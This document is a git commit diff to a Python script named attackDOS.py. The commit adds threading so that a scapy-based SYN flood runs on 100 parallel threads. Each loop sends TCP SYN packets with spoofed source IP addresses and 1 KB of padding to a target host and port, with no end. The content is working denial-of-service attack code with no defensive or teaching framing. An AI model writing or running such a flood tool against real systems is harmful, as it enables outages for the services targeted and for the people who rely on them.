38ee209989ae6e168ccaf71f668b6f1ce5bceab2
Nicolnegg <princesnegg@gamil.com>
2023-04-20 10:50:10 -0500

    thread

--- DOS/attackDOS.py
+++ DOS/attackDOS.py
@@ -1,5 +1,6 @@
 from scapy.all import *
 from faker import Faker
+import threading
 
 conf.verb = 0
 
@@ -11,11 +12,25 @@ endIP = 10
 
 packet_number = 0
 
-while True:    
-    packet_number += 1 
-    packet = scapy.all.IP(src= (origenIP+str(endIP)), dst= host) / scapy.all.TCP(sport= RandShort(), dport= port, flags="S")/Raw(b"X"*1024)
-    send(packet, inter= 0.0002, verbose=False)  
-    print("Packet %d sent" %packet_number)
-    endIP += 1 
-    if(endIP == 200):
-        endIP = 10
+def send_packets():
+    global packet_number, endIP
+    while True:    
+        packet_number += 1 
+        packet = scapy.all.IP(src= (origenIP+str(endIP)), dst= host) / scapy.all.TCP(sport= RandShort(), dport= port, flags="S")/Raw(b"X"*1024)
+        send(packet, inter= 0.0002, verbose=False)  
+        print("Packet %d sent" %packet_number)
+        endIP += 1 
+        if(endIP == 200):
+            endIP = 10
+
+# create multiple threads to send packets
+num_threads = 100
+threads = []
+for i in range(num_threads):
+    t = threading.Thread(target=send_packets)
+    t.start()
+    threads.append(t)
+
+# wait for all threads to finish
+for t in threads:
+    t.join()
